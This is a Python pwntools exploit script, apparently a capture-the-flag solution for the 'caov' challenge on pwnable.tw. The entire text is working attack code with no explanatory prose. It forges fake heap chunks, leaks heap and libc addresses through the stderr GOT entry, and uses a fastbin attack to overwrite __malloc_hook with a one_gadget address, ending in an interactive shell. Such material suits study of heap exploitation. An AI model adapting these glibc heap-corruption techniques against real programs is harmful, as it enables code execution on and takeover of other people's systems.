from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./caov')
	elf = ELF('./caov')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('chall.pwnable.tw', 10306)
	elf = ELF('./caov')
	libc = ELF('./libc_64.so.6')
def show():
	p.recvuntil('choice:')
	p.sendline('1')

def edit(name, length, key, value=1):
	p.recvuntil('choice:')
	p.sendline('2')
	p.recvuntil('name:')
	p.sendline(name)
	p.recvuntil('length:')
	p.sendline(str(length))
	if length == 0:
		return
	p.recvuntil('Key:')
	p.sendline(key)
	p.recvuntil('Value:')
	p.sendline(str(value))

#gdb.attach(p, 'b *0x4014E9')

#leak heap address
p.recvuntil('name:')
p.sendline('kotori')
p.recvuntil('key:')
p.sendline('\0' + 'A' * 0x30)
p.recvuntil('value:')
p.sendline('1')

show()
fake_name = p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
edit(fake_name.ljust(0x60, '\x00') + p64(0x6032C0 + 0x10), 0x7, 'B' * 0x7)
fake_name = p64(0) + p64(0x41) + p64(0) * 7 + p64(0x21)
edit(fake_name.ljust(0x60, '\x00') + p64(0x6032C0 + 0x10), 0, '')
p.recvuntil('Your data info after editing:\nKey: ')
result = p.recvline()[:-1]
heap_addr = u64(result.ljust(8, '\0'))
log.success('heap_addr: ' + hex(heap_addr))


#leak libc
#gdb.attach(p, 'b *0x4014E9')
fake_name = p64(0) + p64(0x41) + p64(heap_addr + 0x40) + p64(0) * 6 + p64(0x21)
edit(fake_name.ljust(0x60, '\x00') + p64(0), 0x30, '\x00')
edit(fake_name.ljust(0x60, '\x00') + p64(0), 0x30, p64(elf.got['stderr']))
p.recvuntil('Your data info after editing:\nKey: ')
result = p.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['_IO_2_1_stderr_']
log.success('libc: ' + hex(libc_addr))
main_arena_addr = libc_addr + libc.symbols['__malloc_hook'] + 0x10
log.success('main_arena_addr: ' + hex(main_arena_addr))

#malloc_hook
#gdb.attach(p)
fake_name = p64(0) + p64(0x71)
edit(fake_name.ljust(0x60, '\x00') + p64(0x6032C0 + 0x10) + p64(0) * 2 + p64(0x21), 0, '')
fake_name = p64(0) + p64(0x71) + p64(main_arena_addr - 0x33)
edit(fake_name.ljust(0x60, '\x00') + p64(0) + p64(0) * 2 + p64(0x21), 0x60, '\x00')
#one_gadget = libc_addr + 0xf02a4
one_gadget = libc_addr + 0xef6c4
edit('\x00', 0x61, 'A' * 0x13 + p64(one_gadget))


p.interactive()

